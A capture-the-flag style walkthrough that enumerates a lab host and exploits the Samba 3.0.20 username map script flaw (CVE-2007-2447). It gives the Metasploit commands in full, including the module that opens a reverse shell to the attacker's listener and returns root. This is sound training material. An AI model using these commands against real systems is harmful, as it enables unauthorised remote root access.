## Enumeration

### Nmap

```bash
nmap -sC -sV -oN nmap/initial 10.10.10.3
```

**Results:**

```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1
139/tcp open  netbios-ssn Samba 3.X
445/tcp open  microsoft-ds Samba 3.X
```

**Interesting findings:**
- Port 21 FTP is running vsftpd — anonymous login is worth a try
- Ports 139/445 Samba — version enumeration here is key, 3.0.20 is very old and has known CVEs

### FTP Anonymous Login

```bash
ftp 10.10.10.3
# login: anonymous
# password: <blank>
```

Got in, but nothing useful in there. Dead end.

### SMB Version Check

```bash
smbclient -L //10.10.10.3
```

Came back as Samba 3.0.20. Googled the version and landed on CVE-2007-2447 — username map script command injection vulnerability. Affects Samba 3.0.0 through 3.0.25rc3. This is the path.

## Attack Plan

### Option A: exploit/multi/handler ✗

**Why you tried it:** Honestly not sure, just grabbed the wrong module out of habit.

1. Launched metasploit and set the wrong module:
```bash
msfconsole
use exploit/multi/handler
set RHOSTS 10.10.10.3
run
```
Result:
```
Nothing. No connection. Just sat there.
```

**Why it failed:** `multi/handler` is a listener for catching callbacks from payloads you've already delivered — it's not an active exploit. Wrong tool for the job here. Wasted about 20 minutes on this.

---

### Option B: exploit/multi/samba/usermap_script ✓

**Why this worked:** CVE-2007-2447 lets you inject shell commands through the username field in Samba's MS-RPC calls when the `username map script` option is enabled. No auth needed.

1. Load the correct module:
```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set LHOST <your tun0 IP>
run
```
Result:
```
[*] Started reverse TCP handler on <LHOST>:4444
[*] Command shell session 1 opened
```

2. Shell looked completely blank at first — thought it bombed out. Just typed a command to check:
```bash
id
```
Result:
```
uid=0(root) gid=0(root)
```

Root shell straight away. No privesc needed.
